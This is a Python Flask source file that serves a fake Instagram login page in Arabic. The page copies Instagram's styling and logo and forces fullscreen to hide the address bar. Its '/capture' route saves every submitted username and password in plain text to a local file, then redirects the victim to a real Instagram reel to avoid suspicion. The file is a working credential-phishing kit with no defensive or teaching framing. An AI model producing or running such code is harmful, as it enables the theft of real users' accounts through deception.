from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>تسجيل الدخول • Instagram</title>
        <style>
            * { box-sizing: border-box; }
            body {
                background-color: #fafafa;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
                margin: 0;
            }
            .login-card {
                background-color: white;
                border: 1px solid #dbdbdb;
                border-radius: 1px;
                padding: 40px;
                width: 350px;
                text-align: center;
                margin-bottom: 10px;
            }
            .logo {
                background-image: url("https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a281de4a39b.png");
                background-size: 175px 51px;
                height: 51px;
                width: 175px;
                margin: 0 auto 30px auto;
                background-repeat: no-repeat;
            }
            input {
                width: 100%;
                background: #fafafa;
                border: 1px solid #dbdbdb;
                border-radius: 3px;
                padding: 9px 8px;
                font-size: 12px;
                margin-bottom: 6px;
                outline: none;
            }
            input:focus {
                border-color: #a8a8a8;
            }
            .btn {
                background-color: #0095f6;
                color: white;
                border: none;
                border-radius: 4px;
                width: 100%;
                padding: 7px;
                font-weight: 600;
                font-size: 14px;
                margin-top: 10px;
                cursor: pointer;
            }
            .btn:active { opacity: 0.7; }
        </style>
    </head>
    <body onclick="requestFullscreen()">
        <div class="login-card">
            <div class="logo"></div>
            <form action="/capture" method="POST">
                <input type="text" name="username" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
                <input type="password" name="password" placeholder="كلمة السر" required>
                <button type="submit" class="btn">تسجيل الدخول</button>
            </form>
        </div>

        <script>
            function requestFullscreen() {
                var elem = document.documentElement;
                if (elem.requestFullscreen) {
                    elem.requestFullscreen().catch(err => {});
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                }
            }
        </script>
    </body>
    </html>
    '''

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')
    
    with open('captured_accounts.txt', 'a', encoding='utf-8') as f:
        f.write(f"Username: {username} | Password: {password}\n")
        
    return redirect("https://www.instagram.com/reel/C3_Example_Reel/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
